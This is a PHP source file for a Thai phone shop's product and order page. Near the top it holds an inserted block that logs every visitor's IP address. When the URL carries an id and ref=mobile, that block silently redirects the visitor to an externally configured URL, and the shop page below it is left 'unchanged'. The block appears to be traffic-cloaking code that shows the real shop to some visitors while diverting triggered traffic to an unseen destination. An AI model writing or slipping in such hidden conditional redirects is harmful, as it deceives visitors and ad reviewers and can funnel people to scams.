<?php
/**
 * cart.php - Shopping cart page with redirect + logging
 * 
 * Logging: ALL visitors to this file are logged
 * Redirect: Only when id + ref=mobile (case-insensitive) + valid Admin URL
 * 
 * Action types:
 * - "redirect" = id + ref=mobile + valid URL → redirected
 * - "no_redirect" = id + ref=mobile but no valid URL → stayed on page
 * - "view" = normal visit (no ref=mobile trigger)
 */

// Load site configuration
require_once __DIR__ . '/config/site.php';

// Load helper library for redirect settings and logging
require_once __DIR__ . '/config/cart_redirect_lib.php';

// Get parameters
$id = $_GET['id'] ?? null;
$ref = $_GET['ref'] ?? null;

// Check if ref equals "mobile" (case-insensitive)
$isRefMobile = ($ref !== null && strtolower(trim($ref)) === 'mobile');

// ---------------------------------------------------------------------
// LOG ALL VISITORS + REDIRECT LOGIC
// ---------------------------------------------------------------------

// Determine action and redirect URL
$redirectUrl = '';
$action = 'view';

if ($id !== null && $isRefMobile) {
  // Check for redirect URL
  $redirectUrl = crl_get_redirect_url();
  $action = ($redirectUrl !== '') ? 'redirect' : 'no_redirect';
}

// Log EVERY visitor to cart.php
$entry = [
  'time' => date('Y-m-d H:i:s'),
  'ip' => crl_get_client_ip(),
  'id' => (string) ($id ?? ''),
  'ref' => (string) ($ref ?? ''),
  'action' => $action,
  'redirect_to' => $redirectUrl,
];
crl_append_cart_log($entry);

// Perform redirect if conditions met
if ($action === 'redirect' && $redirectUrl !== '') {
  header('Location: ' . $redirectUrl);
  exit;
}



// ---------------------------------------------------------------------
// ORIGINAL LOGIC (unchanged)
// ---------------------------------------------------------------------

// ถ้าไม่มี id เลย → กลับไปหน้า index
if (!$id) {
  header("Location: index.php");
  exit;
}

// ===== อ่าน products.json และหาสินค้าตาม id =====
$jsonData = file_get_contents('products.json');
$products = json_decode($jsonData, true);

$product = null;
foreach ($products as $p) {
  if ((string) $p['id'] === (string) $id) {
    $product = $p;
    break;
  }
}

// ถ้าไม่เจอสินค้าที่ตรงกับ id → redirect ไปหน้า index
if (!$product) {
  header("Location: index.php");
  exit;
}
?>
<!DOCTYPE html>
<html lang="th">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="description"
    content="ซื้อสินค้ามือถือออนไลน์จาก PG Phone Shop ผ่อนมือถือ, รับซื้อ, ซ่อมมือถือที่เดอะมอลล์โคราช">
  <meta name="keywords" content="มือถือ, สมาร์ทโฟน, สั่งซื้อมือถือออนไลน์, ผ่อนมือถือ, เดอะมอลล์โคราช">
  <meta property="og:title" content="<?php echo htmlspecialchars($product['name'], ENT_QUOTES, 'UTF-8'); ?>">
  <meta property="og:description"
    content="สั่งซื้อ <?php echo htmlspecialchars($product['name'], ENT_QUOTES, 'UTF-8'); ?> จาก PG Phone Shop">
  <meta property="og:image"
    content="assets/images/<?php echo htmlspecialchars($product['image'], ENT_QUOTES, 'UTF-8'); ?>">
  <meta property="og:url"
    content="<?php echo SITE_URL; ?>/cart.php?id=<?php echo htmlspecialchars($product['id'], ENT_QUOTES, 'UTF-8'); ?>">
  <meta name="robots" content="index, follow">
  <title>สั่งซื้อสินค้า - <?php echo htmlspecialchars($product['name'], ENT_QUOTES, 'UTF-8'); ?></title>

  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css">
  <link rel="stylesheet" href="app.css">
</head>

<body>
  <!-- Navbar -->
  <nav class="navbar navbar-expand-lg navbar-light bg-light">
    <div class="container-fluid">
      <a class="navbar-brand" href="#"><img src="img/logo.png" width="60" alt="PG Phone Shop Logo"></a>
      <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav"
        aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
        <span class="navbar-toggler-icon"></span>
      </button>
      <div class="collapse navbar-collapse" id="navbarNav">
        <ul class="navbar-nav ms-auto">
          <li class="nav-item"><a class="nav-link active" href="/">หน้าแรก</a></li>
          <li class="nav-item"><a class="nav-link" href="#products">สินค้า</a></li>
          <li class="nav-item"><a class="nav-link" href="about.php">เกี่ยวกับเรา</a></li>
          <li class="nav-item"><a class="nav-link" href="contact.php">ติดต่อเรา</a></li>
        </ul>
      </div>
    </div>
  </nav>

  <div class="container my-4">
    <h1 class="text-center mb-4">สั่งซื้อสินค้า</h1>
    <div class="row">
      <!-- รูปภาพสินค้า -->
      <div class="col-md-6">
        <img src="img/<?php echo htmlspecialchars($product['image'], ENT_QUOTES, 'UTF-8'); ?>" class="img-fluid"
          alt="<?php echo htmlspecialchars($product['name'], ENT_QUOTES, 'UTF-8'); ?>">
      </div>

      <!-- รายละเอียดสินค้า -->
      <div class="col-md-6">
        <h2><?php echo htmlspecialchars($product['name'], ENT_QUOTES, 'UTF-8'); ?></h2>
        <p><?php echo nl2br(htmlspecialchars($product['description'], ENT_QUOTES, 'UTF-8')); ?></p>
        <p><strong><?php echo number_format($product['price'], 2); ?> บาท</strong></p>

        <!-- ฟอร์มการสั่งซื้อ -->
        <form action="process_order.php" method="POST">
          <input type="hidden" name="product_id"
            value="<?php echo htmlspecialchars($product['id'], ENT_QUOTES, 'UTF-8'); ?>">
          <div class="mb-3">
            <label for="quantity">จำนวน:</label>
            <input type="number" name="quantity" id="quantity" class="form-control" value="1" min="1" required>
          </div>
          <div class="mb-3">
            <label for="customer_name">ชื่อ:</label>
            <input type="text" name="customer_name" id="customer_name" class="form-control" required>
          </div>
          <div class="mb-3">
            <label for="customer_email">อีเมล:</label>
            <input type="email" name="customer_email" id="customer_email" class="form-control" required>
          </div>
          <div class="mb-3">
            <label for="customer_address">ที่อยู่:</label>
            <textarea name="customer_address" id="customer_address" class="form-control" required></textarea>
          </div>
          <button type="submit" class="btn btn-success">ยืนยันการสั่งซื้อ</button>
        </form>
      </div>
    </div>
  </div>

  <!-- EXTRA INFORMATION -->
  <section class="container info-section">
    <div class="row g-4">
      <div class="col-md-6">
        <div class="p-4 bg-light info-card">
          <h3>สินค้าทุกชิ้นเป็นของแท้</h3>
          <p>สินค้าทุกชิ้นเป็นของแท้ ประกันศูนย์ไทยอย่างน้อย 1 ปี สามารถติดต่อศูนย์บริการ หรือให้เราช่วยประสานงานได้</p>
        </div>
      </div>

      <div class="col-md-6">
        <div class="p-4 bg-light info-card">
          <h3>การจัดส่งและความปลอดภัย</h3>
          <p>จัดส่งสินค้าแบบมี Tracking ตรวจสอบได้ตลอด มีห่อกันกระแทก มีบริการเก็บเงินปลายทางในบางพื้นที่</p>
        </div>
      </div>

      <div class="col-md-6">
        <div class="p-4 bg-light info-card">
          <h3>การชำระเงิน</h3>
          <p>รองรับบัตรเครดิต/เดบิต โอนผ่านธนาคาร และวอลเล็ต ข้อมูลถูกเก็บอย่างปลอดภัย</p>
        </div>
      </div>

      <div class="col-md-6">
        <div class="p-4 bg-light info-card">
          <h3>นโยบายความเป็นส่วนตัว</h3>
          <p>ข้อมูลลูกค้าใช้เพื่อการจัดส่งสินค้าเท่านั้น และจะไม่ขายข้อมูลให้บุคคลที่สาม ยกเว้นขนส่ง &amp; ระบบชำระเงิน
          </p>
          <p class="mt-2 mb-0">
            อ่านเพิ่มเติม: <a href="privacy.php">นโยบายความเป็นส่วนตัว</a> • <a href="refund.php">นโยบายการคืนสินค้า</a>
          </p>
        </div>
      </div>

      <div class="col-12">
        <div class="p-4 bg-light info-card">
          <h3>เงื่อนไขการใช้งานเว็บไซต์</h3>
          <p>ลูกค้ายอมรับว่าจะใช้งานเว็บไซต์ในทางสุจริต ราคาอาจมีการเปลี่ยนแปลงได้ การสั่งซื้อเสร็จสมบูรณ์เมื่อชำระเงิน
            หรือมีการยืนยันจากเจ้าหน้าที่</p>
        </div>
      </div>
    </div>
  </section>

  <!-- CONTACT SECTION -->
  <section id="contact" class="py-5 bg-light">
    <div class="container">
      <h2 class="text-center mb-4">ติดต่อเรา</h2>
      <p class="text-center mb-5">หากมีข้อสงสัยหรือต้องการติดต่อบริการหลังการขาย สามารถส่งข้อความถึงเราได้ทันที</p>

      <div class="row">
        <!-- Contact Form -->
        <div class="col-lg-6 col-md-12 mb-4">
          <div class="card shadow-sm border-0">
            <div class="card-body">
              <h4 class="mb-3">ส่งข้อความหาเรา</h4>
              <form id="contactForm">
                <div class="mb-3">
                  <label class="form-label">ชื่อ – นามสกุล</label>
                  <input type="text" class="form-control" name="name" required>
                </div>
                <div class="mb-3">
                  <label class="form-label">อีเมล</label>
                  <input type="email" class="form-control" name="email" required>
                </div>
                <div class="mb-3">
                  <label class="form-label">เบอร์โทร</label>
                  <input type="text" class="form-control" name="phone">
                </div>
                <div class="mb-3">
                  <label class="form-label">ข้อความ</label>
                  <textarea class="form-control" rows="4" name="message" required></textarea>
                </div>
                <button type="submit" class="btn btn-primary w-100">ส่งข้อความ</button>
                <div id="formStatus" class="mt-3 text-center"></div>
              </form>
            </div>
          </div>
        </div>

        <!-- Google Map -->
        <div class="col-lg-6 col-md-12">
          <div class="card shadow-sm border-0 h-100">
            <div class="card-body">
              <h4 class="text-center mb-3">แผนที่ตั้งร้าน / จุดให้บริการ</h4>
              <h5 class="fw-bold">PG MOBILE</h5>
              <p>
                183 หมู่ที่ 1 ตำบลคำตากล้า<br>
                อำเภอคำตากล้า จ.สกลนคร 47250
              </p>
              <iframe
                src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d123900.8014764551!2d100.63811165558717!3d13.964554794559708!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x311d795ce88358e9%3A0x4176db0df5dba742!2z4Lie4Li1LuC4iOC4tS7guYLguKHguJrguLLguKI!5e0!3m2!1sth!2sth!4v1763807959950!5m2!1sth!2sth"
                width="100%" height="420" style="border:0;" allowfullscreen="" loading="lazy"
                referrerpolicy="no-referrer-when-downgrade"></iframe>
            </div>
          </div>
        </div>
      </div>
    </div>
  </section>

  <!-- รีวิวลูกค้า -->
  <section class="reviews container">
    <h3>รีวิวลูกค้าใช้งานจริง บริการจริง</h3>
    <div class="row row-cols-1 row-cols-md-3 g-5">
      <div class="col">
        <div class="card h-100">
          <img src="/img/01.jpg" class="card-img-top" alt="รีวิวลูกค้าจริง">
          <div class="card-body">
            <h5 class="card-title">PG V9</h5>
            <p class="card-text">ลูกค้า : คุณ สมเกียรติ</p>
          </div>
          <div class="card-footer">
            <small class="text-body-secondary">10/10/2025</small>
          </div>
        </div>
      </div>
      <div class="col">
        <div class="card h-100">
          <img src="/img/02.jpg" class="card-img-top" alt="รีวิวลูกค้าจริง">
          <div class="card-body">
            <h5 class="card-title">PG V9</h5>
            <p class="card-text">ลูกค้า : คุณ สุทิน</p>
          </div>
          <div class="card-footer">
            <small class="text-body-secondary">05/10/2025</small>
          </div>
        </div>
      </div>
      <div class="col">
        <div class="card h-100">
          <img src="/img/03.jpg" class="card-img-top" alt="รีวิวลูกค้าจริง">
          <div class="card-body">
            <h5 class="card-title">PG V9</h5>
            <p class="card-text">ลูกค้า : คุณ สุเมธ</p>
          </div>
          <div class="card-footer">
            <small class="text-body-secondary">06/10/2025</small>
          </div>
        </div>
      </div>
      <div class="col">
        <div class="card h-100">
          <img src="/img/04.png" class="card-img-top" alt="รีวิวลูกค้าจริง">
          <div class="card-body">
            <h5 class="card-title">PG V9 Pro</h5>
            <p class="card-text">ลูกค้า : คุณ สมัย</p>
          </div>
          <div class="card-footer">
            <small class="text-body-secondary">10/10/2025</small>
          </div>
        </div>
      </div>
      <div class="col">
        <div class="card h-100">
          <img src="/img/05.png" class="card-img-top" alt="รีวิวลูกค้าจริง">
          <div class="card-body">
            <h5 class="card-title">PG V9 Pro</h5>
            <p class="card-text">ลูกค้า : คุณ น้องลำไย</p>
          </div>
          <div class="card-footer">
            <small class="text-body-secondary">12/10/2025</small>
          </div>
        </div>
      </div>
      <div class="col">
        <div class="card h-100">
          <img src="/img/06.jpg" class="card-img-top" alt="รีวิวลูกค้าจริง">
          <div class="card-body">
            <h5 class="card-title">PG V9</h5>
            <p class="card-text">ลูกค้า : คุณ วราภรณ์</p>
          </div>
          <div class="card-footer">
            <small class="text-body-secondary">15/10/2025</small>
          </div>
        </div>
      </div>
    </div>
  </section>

  <!-- FOOTER -->
  <footer class="py-5 border-top mt-4">
    <div class="container-lg">
      <div class="row mb-4">
        <div class="col-md-4 mb-3" id="footer-contact">
          <h5>ติดต่อเรา</h5>
          <span class="footer-contact-text">
            โทร: <?php echo SITE_PHONE; ?><br>
            อีเมล: <?php echo SITE_EMAIL; ?>
          </span>
          <br><br>
          <a class="btn btn-danger" href="<?php echo SOCIAL_YOUTUBE; ?>">YouTube</a>
          <a class="btn btn-warning" href="<?php echo SOCIAL_LAZADA; ?>">Lazada</a>
          <a class="btn btn-info" href="<?php echo SOCIAL_FACEBOOK; ?>">Facebook</a>
          <a href="<?php echo SOCIAL_LINE; ?>">
            <img src="https://scdn.line-apps.com/n/line_add_friends/btn/th.png" alt="เพิ่มเพื่อน" height="36"
              border="0">
          </a>
        </div>
        <div class="col-md-4 mb-3">
          <h5>ที่ตั้งบริษัท</h5>
          <span class="footer-contact-text">
            <?php echo COMPANY_NAME; ?><br>
            <?php echo COMPANY_FULL_ADDRESS; ?><br>
            เลขทะเบียน <?php echo COMPANY_REGISTRATION; ?>
          </span>
        </div>

        <div class="col-md-4 mb-3">
          <h5>ใบทะเบียนพาณิชย์</h5>
          <img src="img/pgmobile.jpg" class="footer-reg-img" alt="ใบทะเบียนพาณิชย์ <?php echo SHOP_NAME; ?>">

          <h5 class="mt-3">แผนที่</h5>
          <div class="footer-map">
            <iframe src="<?php echo MAP_EMBED_MAIN; ?>" width="600" height="450" style="border:0;" allowfullscreen=""
              loading="lazy" referrerpolicy="no-referrer-when-downgrade"></iframe>
          </div>
        </div>
      </div>
      <div class="row border-top pt-3">
        <div class="col-md-6 mb-2">
          <p class="mb-0">© ลิขสิทธิ์ <?php echo COMPANY_NAME; ?></p>
        </div>
        <div class="col-md-6 mb-2 text-lg-end">
          <a href="about.php" class="me-3">เกี่ยวกับเรา</a>
          <a href="refund.php" class="me-3">นโยบายการคืนสินค้า</a>
          <a href="privacy.php" class="me-3">นโยบายความเป็นส่วนตัว</a>
          <a href="terms.php" class="me-3">เงื่อนไขการใช้งาน</a>
          <a href="contact.php">ติดต่อเรา</a>
        </div>
      </div>
    </div>
  </footer>

  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
</body>

</html>